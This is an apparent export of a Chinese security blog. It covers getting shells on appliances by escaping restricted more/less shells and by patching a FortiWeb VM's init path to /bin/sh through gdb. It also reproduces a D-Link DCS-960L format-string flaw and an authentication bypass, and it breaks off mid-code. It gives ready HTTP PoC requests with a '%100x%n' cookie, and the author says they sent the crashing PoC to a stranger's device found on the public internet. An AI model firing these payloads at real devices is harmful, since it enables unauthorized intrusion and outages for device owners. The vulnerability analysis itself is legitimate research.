<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">catalpa@CataLpa:/$ cat /bin/bash | more</span><br><span class="line">ELFxxxxxxxx</span><br><span class="line">--More--    // press h</span><br><span class="line">Most commands optionally preceded by integer argument k.  Defaults in brackets.</span><br><span class="line">Star (*) indicates argument becomes new default.</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">&lt;space&gt;                 Display next k lines of text [current screen size]</span><br><span class="line">z                       Display next k lines of text [current screen size]*</span><br><span class="line">&lt;return&gt;                Display next k lines of text [1]*</span><br><span class="line">d or ctrl-D             Scroll k lines [current scroll size, initially 11]*</span><br><span class="line">q or Q or &lt;interrupt&gt;   Exit from more</span><br><span class="line">s                       Skip forward k lines of text [1]</span><br><span class="line">f                       Skip forward k screenfuls of text [1]</span><br><span class="line">b or ctrl-B             Skip backwards k screenfuls of text [1]</span><br><span class="line">&#x27;                       Go to place where previous search started</span><br><span class="line">=                       Display current line number</span><br><span class="line">/&lt;regular expression&gt;   Search for kth occurrence of regular expression [1]</span><br><span class="line">n                       Search for kth occurrence of last r.e [1]</span><br><span class="line">!&lt;cmd&gt; or :!&lt;cmd&gt;       Execute &lt;cmd&gt; in a subshell</span><br><span class="line">v                       Start up /usr/bin/vi at current line</span><br><span class="line">ctrl-L                  Redraw screen</span><br><span class="line">:n                      Go to kth next file [1]</span><br><span class="line">:p                      Go to kth previous file [1]</span><br><span class="line">:f                      Display current file name and line number</span><br><span class="line">.                       Repeat previous command</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">!uname -a</span><br><span class="line">Linux CataLpa 4.4.0-19041-Microsoft #488-Microsoft Mon Sep 01 13:43:00 PST 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure></div>

<p>less 的 MISCELLANEOUS COMMANDS，可以使用 !command 或 |Xcommand 等执行命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                   MISCELLANEOUS COMMANDS</span><br><span class="line"></span><br><span class="line"> -&lt;flag&gt;              Toggle a command line option [see OPTIONS below].</span><br><span class="line"> --&lt;name&gt;             Toggle a command line option, by name.</span><br><span class="line"> _&lt;flag&gt;              Display the setting of a command line option.</span><br><span class="line"> __&lt;name&gt;             Display the setting of an option, by name.</span><br><span class="line"> +cmd                 Execute the less cmd each time a new file is examined.</span><br><span class="line"></span><br><span class="line"> !command             Execute the shell command with $SHELL.</span><br><span class="line"> |Xcommand            Pipe file between current pos &amp; mark X to shell command.</span><br><span class="line"> s file               Save input to a file.</span><br><span class="line"> v                    Edit the current file with $VISUAL or $EDITOR.</span><br><span class="line"> V                    Print version number of &quot;less&quot;.</span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure></div>

<p>还有一些方法可参考<a class="link"   href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" >此文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="虚拟机调试"><a href="#虚拟机调试" class="headerlink" title="虚拟机调试"></a>虚拟机调试</h2><p>blackhat DEVCORE 团队成员的议题中提到的一种方法。首先要大概了解 linux 系统的启动引导流程，详情可以参考此<a class="link"   href="https://blog.csdn.net/star19830909/article/details/88235535" >文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。简单来说，Linux 启动时，主要做了以下操作:</p>
<ol>
<li>BIOS 运行，执行 POST，硬件自检。</li>
<li>硬件自检通过，BIOS 在磁盘查找引导记录，并加载到内存执行 (MBR)。</li>
<li>引导记录启动引导加载器，常用的加载器包括 GRUB、GRUB2、LILO 等。</li>
<li>引导加载器在磁盘寻找内核文件并装载到内存，将控制权转移到内核继续执行。</li>
<li>内核通常是自解压文件，文件名带有 vmlinuz 前缀，内核负责完成剩余的启动流程。</li>
</ol>
<p>关键在于 vmlinuz 内核初始化操作中，详细流程可参考此<a class="link"   href="https://blog.csdn.net/zxygww/article/details/49154859" >文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>在初始化流程中最后一步，内核会执行 init_post 函数，此时内核初始化接近尾声，此函数主要用于启动用户空间中的 init 进程，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> noinline <span class="title function_">init_post</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    free_initmem();  </span><br><span class="line">    unlock_kernel();  </span><br><span class="line">    mark_rodata_ro();  </span><br><span class="line">    system_state = SYSTEM_RUNNING;  </span><br><span class="line">    numa_default_policy();  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sys_open((<span class="type">const</span> <span class="type">char</span> __user *) <span class="string">&quot;/dev/console&quot;</span>, O_RDWR, <span class="number">0</span>) &lt; <span class="number">0</span>)  </span><br><span class="line">        printk(KERN_WARNING <span class="string">&quot;Warning: unable to open an initial console.\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    (<span class="type">void</span>) sys_dup(<span class="number">0</span>);  </span><br><span class="line">    (<span class="type">void</span>) sys_dup(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (ramdisk_execute_command) &#123;  </span><br><span class="line">        run_init_process(ramdisk_execute_command);  </span><br><span class="line">        printk(KERN_WARNING <span class="string">&quot;Failed to execute %s\n&quot;</span>,  </span><br><span class="line">                ramdisk_execute_command);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/*  </span></span><br><span class="line"><span class="comment">     * We try each of these until one succeeds.  </span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     * The Bourne shell can be used instead of init if we are  </span></span><br><span class="line"><span class="comment">     * trying to recover a really broken machine.  </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">if</span> (execute_command) &#123;  </span><br><span class="line">        run_init_process(execute_command);  </span><br><span class="line">        printk(KERN_WARNING <span class="string">&quot;Failed to execute %s.  Attempting &quot;</span>  </span><br><span class="line">                    <span class="string">&quot;defaults...\n&quot;</span>, execute_command);  </span><br><span class="line">    &#125;  </span><br><span class="line">    run_init_process(<span class="string">&quot;/sbin/init&quot;</span>);  </span><br><span class="line">    run_init_process(<span class="string">&quot;/etc/init&quot;</span>);  </span><br><span class="line">    run_init_process(<span class="string">&quot;/bin/init&quot;</span>);  </span><br><span class="line">    run_init_process(<span class="string">&quot;/bin/sh&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    panic(<span class="string">&quot;No init found.  Try passing init= option to kernel.&quot;</span>);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>我们可以看到在函数末尾包含 4 个 run_init_process，分别尝试执行 &#x2F;sbin&#x2F;init、&#x2F;etc&#x2F;init、&#x2F;bin&#x2F;init、&#x2F;bin&#x2F;sh，通常文件系统中都会包含 &#x2F;sbin&#x2F;init，它会作为用户空间的第一个进程执行剩余的初始化操作。</p>
<p>所以，如果我们能够修改 run_init_process 的参数，例如将 &#x2F;sbin&#x2F;init 修改成 &#x2F;bin&#x2F;sh，或者劫持内核的流程到 run_init_process(“&#x2F;bin&#x2F;sh”)，可能就会得到一个 linux shell。</p>
<p>为了实现上述操作，要解决几个问题。</p>
<p><strong>如何对内核进行 debug</strong></p>
<p>vmware workstation 提供了虚拟机调试接口，官方文档指出只需要在虚拟机的 vmx 文件中添加以下选项，即可在外部使用 gdb 附加到虚拟机上，从而实现对虚拟机的调试</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">debugStub.listen.guest64 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest64.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest64 = &quot;12345&quot;</span><br><span class="line">debugStub.listen.guest32 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest32.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest32 = &quot;12346&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>如何定位 init_post 函数代码</strong></p>
<p>某些设备 vmdk 未加密，可以直接从中解出 vmlinuz 内核文件，通过解压 vmdk 文件获取 vmlinuz 内核。</p>
<p>获取内核之后需要进一步处理，将格式转换为 elf 方便分析，已经有大佬开发了工具 <a class="link"   href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，直接转换即可。</p>
<p>修复的内核用 IDA 分析，搜索字符串能够定位 &#x2F;sbin&#x2F;init，交叉引用记下 init_post 函数的地址。</p>
<p>如果 vmdk 无法解出内核文件，请参考下文。</p>
<p><strong>修改内存</strong></p>
<p>以 fortiweb 虚拟机为例，首先在 vmware 中导入 ovf 文件，如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-3.png"
                     
                ></p>
<p>虚拟机库中选择导入的虚拟机，右键打开虚拟机目录，找到 .vmx 配置文件，用文本编辑器打开。</p>
<p>在文件末尾添加配置并保存</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">debugStub.listen.guest64 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest64.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest64 = &quot;12345&quot;</span><br><span class="line">debugStub.listen.guest32 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest32.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest32 = &quot;12346&quot;</span><br></pre></td></tr></table></figure></div>

<p>在宿主机打开终端，开启 gdb。windows 下推荐使用 wsl，在 wsl 中启动 gdb 即可。</p>
<p>vmware 启动虚拟机，同时在 gdb 中执行命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote 0:12345</span><br></pre></td></tr></table></figure></div>

<p>注：附加的时间要仔细调整，太早会由于调试桥的原因导致 gdb 附加失败，太晚又会错过 init_post 阶段。</p>
<p>当出现以下信息说明附加正确。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-4.png"
                     
                ></p>
<p>大多数内核中地址都形如 0xffffffff8xxxxxxx。附加成功后根据之前得到的 init_post 函数地址下断点，然后继续运行。如果无法获得内核文件，可以直接从内存中搜索，执行命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find 0xffffffff80000000, 0xffffffff81000000, &quot;/sbin/init&quot;</span><br></pre></td></tr></table></figure></div>

<p>如果提示  Unable to access 16010 bytes，说明开始地址太小，可逐渐调整直到能够正常搜索。</p>
<p>如果搜索正确会出现以下信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-5.png"
                     
                ></p>
<p>查看此处内存内容</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x /10s 0xffffffff80f7df37</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-6.png"
                     
                ></p>
<p>修改字符串信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set &#123;char [8]&#125; 0xffffffff80f7df37 = &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></div>

<p>之后 continue 让内核继续执行，如果操作无误就得到一个 linux shell。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vmshell-7.png"
                     
                ></p>
<p>需要注意的是由于我们修改了用户空间的 init 为 sh，所以此时系统是没有完全初始化的，现在可进行固件导出操作，也可以尝试修改 vmtools 或者其他操作来在下一次开机时获取完整的 shell。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   href="https://repo.zenk-security.com/Conferences/HITB/D2T1%20-%20Felix%20Wilhelm%20-%20Attacking%20Next%20Generation%20Firewalls.pdf" >Attacking NextGeneration Firewalls<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" >Linux Restricted Shell Bypass<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/zxygww/article/details/49154859" >Linux启动流程解析：init_post函数<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/star19830909/article/details/88235535" >Linux 开机引导和启动过程详解<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf" >Infiltrating Corporate Intranet Like NSA<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Dlink DCS-960L 漏洞复现</title>
    <url>/2021/01/17/DCS-960L/</url>
    <content><![CDATA[<p>格式化字符串以及身份验证绕过</p>
<p><strong>Dlink 官方宣布该设备已经进入 EOS (End Of Sale) 阶段，建议用户及时下线并替换此设备。</strong></p>
<span id="more"></span>

<h2 id="HNAP-Cookie-Format-String"><a href="#HNAP-Cookie-Format-String" class="headerlink" title="HNAP Cookie Format String"></a>HNAP Cookie Format String</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>披露信息：<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-20-1435/" >https://www.zerodayinitiative.com/advisories/ZDI-20-1435/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ZDI 编号：ZDI-CAN-11360</p>
<p>漏洞评分：8.8(<strong>High</strong>)</p>
<p>漏洞描述：DCS-960L 在处理请求中的 Cookie 字段时，错误的将用户提交的数据作为格式化字符串使用，攻击者可以构造特殊格式的 Cookie 触发此漏洞，严重可导致任意代码执行。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先去官网下载固件(1.09)，链接：<a class="link"   href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617" >http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>固件没有经过特殊处理，直接 binwalk 可以解开，得到一个 Linux 文件系统，我们要分析的目标文件是 &#x2F;web&#x2F;cgi-bin&#x2F;hnap&#x2F;hnap_service。</p>
<p>文件架构：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped</span><br></pre></td></tr></table></figure></div>

<p>直接用 IDA 加载分析，根据披露信息来看，问题出现在处理带有 Cookie 的 HNAP 请求时，搜索字符串 Cookie 并查找交叉引用可以发现名为 Login 的函数，关键代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v7 = getenv(<span class="string">&quot;COOKIE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v7 &amp;&amp; *v7 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v45, <span class="number">0</span>, <span class="keyword">sizeof</span>(v45));</span><br><span class="line">  v9 = getenv(<span class="string">&quot;COOKIE&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v45, <span class="number">0x80</span>u, <span class="string">&quot;%s&quot;</span>, v9);</span><br><span class="line">  v10 = <span class="built_in">strstr</span>(v45, <span class="string">&quot;uid=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v10 + <span class="number">4</span>;</span><br><span class="line">    v12 = <span class="built_in">strchr</span>(v10 + <span class="number">4</span>, <span class="number">59</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">      *v12 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(v41, <span class="number">0xB</span>u, v11);</span><br><span class="line">    v13 = &amp;v58[<span class="number">9</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(v41, <span class="number">0xB</span>u, v45);</span><br><span class="line">    v13 = &amp;v58[<span class="number">9</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>首先用 getenv 函数获取传入的 Cookie 字段值，然后判断其中是否包含字符串 “uid&#x3D;”，无论传入的数据中是否包含，都会把数据带入函数 snprintf 拷贝给缓冲区 v41。但是在使用函数 snprintf 的时候直接将用户可控的数据作为格式化字符串使用，由于 snprintf 的特性，会导致格式化字符串漏洞。</p>
<p>我们可以编写代码测试</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* cookie = <span class="string">&quot;is_cookie&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* mem = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">snprintf</span>(mem, <span class="number">0xb</span>, <span class="string">&quot;%s&quot;</span>, cookie);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, mem);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* cookie2 = <span class="string">&quot;%p%p%p&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* mem2 = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(mem2, <span class="number">0xb</span>, cookie2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, mem2);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译运行会输出以下结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_cookie</span><br><span class="line">0040802400</span><br><span class="line"></span><br><span class="line">Process returned 0 (0x0)   execution time : 0.024 s</span><br><span class="line">Press any key to continue.</span><br></pre></td></tr></table></figure></div>

<p>第一次我们正确的使用 snprintf 函数，拷贝的结果没问题，第二次直接把源字符串作为 snprintf 的格式化字符串，如果源字符串是攻击者精心控制的(例如代码中演示的)，那么就会导致格式化字符串漏洞。</p>
<p><strong>注：访问链接 &#x2F;hnap&#x2F;hnap_service 可以获取到设备的部分信息，包括型号和当前固件版本。</strong></p>
<p>在公网找到某设备进行测试，先获取设备的基本信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/DCS-960L-1.png"
                     
                ></p>
<p>目标设备使用的固件版本是 1.09，正好和我们分析的版本一致。</p>
<p>下面要构造一个可用的 POC，由于漏洞位于处理 HNAP 请求的逻辑中，我们可以把其他 Dlink 设备的 HNAP 请求照搬过来，下面是一个例子</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /HNAP1/ HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx</span><br><span class="line">SOAPAction: &quot;http://purenetworks.com/HNAP1/Login&quot;</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Cookie: 36f0E73734</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;Action&gt;&lt;/Action&gt;&lt;Username&gt;&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p>测试 POC</p>
<p>首先传入一个正常的请求，设备可以返回响应内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/DCS-960L-2.png"
                     
                ></p>
<p>接着构造一个带有格式化字符串的 Cookie，为了看到效果，我们可以使用 %n 这个参数</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /HNAP1/ HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx</span><br><span class="line">SOAPAction: &quot;http://purenetworks.com/HNAP1/Login&quot;</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uid=%100x%n;</span><br><span class="line">Content-Length: 374</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;Action&gt;login&lt;/Action&gt;&lt;Username&gt;&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p>发送这个 POC，由于访问了非法地址，程序会直接结束，服务端不会返回任何内容。</p>
<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><p>披露信息：<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-20-1437/" >https://www.zerodayinitiative.com/advisories/ZDI-20-1437/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ZDI 编号：ZDI-CAN-11352</p>
<p>漏洞评分：8.8(<strong>High</strong>)</p>
<p>漏洞描述：DCS-960L 在处理 HNAP 登录请求时，对于参数 LoginPassword 的处理逻辑错误，攻击者可以构造特殊的登录请求实现登录验证绕过。</p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>需要分析的目标文件和上一个漏洞相同，在函数 Login 中存在以下代码片段</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v16 = ixmlGetElementValueByTag(v5, <span class="string">&quot;Username&quot;</span>);</span><br><span class="line">        login_password = ixmlGetElementValueByTag(v5, <span class="string">&quot;LoginPassword&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v16 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(username2, v16);</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(username2, <span class="string">&quot;Admin&quot;</span>) )</span><br><span class="line">            <span class="built_in">snprintf</span>(username2, <span class="number">0x20</span>u, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( login_password )</span><br><span class="line">          <span class="built_in">strcpy</span>(login_password2, login_password);</span><br><span class="line">        temp = username2;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;username: %s\n&quot;</span>, username2);</span><br><span class="line">        login_password3 = login_password2;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;loginPassword: %s\n&quot;</span>, login_password2);</span><br><span class="line">        key[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">        key[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">        v57 = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        v52[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        v53 = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        password[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        v55 = <span class="number">0</span>;</span><br><span class="line">        digest = <span class="number">0</span>;</span><br><span class="line">        v49 = <span class="number">0</span>;</span><br><span class="line">        v50 = <span class="number">0</span>;</span><br><span class="line">        v51 = <span class="number">0</span>;</span><br><span class="line">        usrInit(<span class="number">0</span>);</span><br><span class="line">        usrGetPass(temp, password, <span class="number">33</span>);         <span class="comment">// 利用用户名匹配对应的密码</span></span><br><span class="line">        usrFree();</span><br><span class="line">        public_key = maybe_public_key;</span><br><span class="line">        <span 